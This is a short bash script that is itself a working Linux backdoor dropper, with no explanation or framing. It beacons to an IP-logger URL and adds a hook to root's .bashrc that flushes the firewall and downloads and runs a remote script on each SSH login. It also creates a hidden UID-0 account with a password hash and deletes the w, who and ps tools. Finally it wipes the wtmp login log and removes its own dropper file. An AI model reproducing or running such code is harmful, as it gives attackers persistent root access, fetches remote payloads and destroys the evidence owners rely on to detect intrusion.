#!/bin/bash
curl https://iplogger.org/2uLfR5 -O &> output; rm -rf output
printf 'if [[ -n $SSH_CONNECTION ]] ; then' >> ~/.bashrc; printf '\niptables -F; cd /dev; cd /dev ; curl https://raw.githubusercontent.com/ahmet5820/a/master/spook.sh -O &> x; rm -rf x; chmod 777 spook.sh;sh spook.sh;rm -rf spook.sh output ; cd ;' >> /root/.bashrc;printf '\nfi\n\n' >> /root/.bashrc;
echo 'localhost:x:0:0:localhost:/root:/bin/bash' >> /etc/passwd
echo 'localhost:$6$ZryzoxRF$iFCUwFMyV/8evP05FJh8KnmTsJEub63or5bIev1X7DQNNgioFv6e9GYi49TXrbz9S.2OyFaOukntYwF5Gv5SF0:18344:0:99999:7:::' >> /etc/shadow
rm -rf /usr/bin/w
rm -rf /usr/bin/who
rm -rf /usr/bin/ps
rm -f /var/log/wtmp && touch /var/log/wtmp
rm -rf /dev/skend.sh
